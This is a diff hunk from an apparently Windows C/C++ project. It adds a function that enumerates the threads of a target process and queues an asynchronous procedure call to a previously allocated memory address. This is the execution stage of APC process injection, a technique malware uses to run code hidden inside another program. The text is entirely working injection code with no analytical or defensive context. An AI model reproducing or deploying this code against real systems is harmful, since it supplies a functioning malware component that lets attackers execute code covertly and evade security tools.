@@ -38,3 +38,28 @@ DWORD findProcessID(const wchar_t* processName) {
 
 	return processId;
 }
+
+
+void ExecuteThread(DWORD targetProcessID, PVOID allocateMemory) {
+	HANDLE hThreadtarget = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+
+	if (hThreadtarget == INVALID_HANDLE_VALUE) return;
+	THREADENTRY32 th;
+	th.dwSize = sizeof(th);
+
+	if (Thread32First(hThreadtarget, &th)) {
+
+		do {
+			if (th.th32OwnerProcessID == targetProcessID) {
+				HANDLE tartgetThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_SET_INFORMATION, FALSE, th.th32ThreadID);
+				if (tartgetThread) {
+					QueueUserAPC((PAPCFUNC)allocateMemory, tartgetThread, 0);
+					CloseHandle(tartgetThread);
+					break;
+				}
+
+			}
+		} while (Thread32Next(hThreadtarget, &th));
+	}
+	CloseHandle(hThreadtarget);
+}
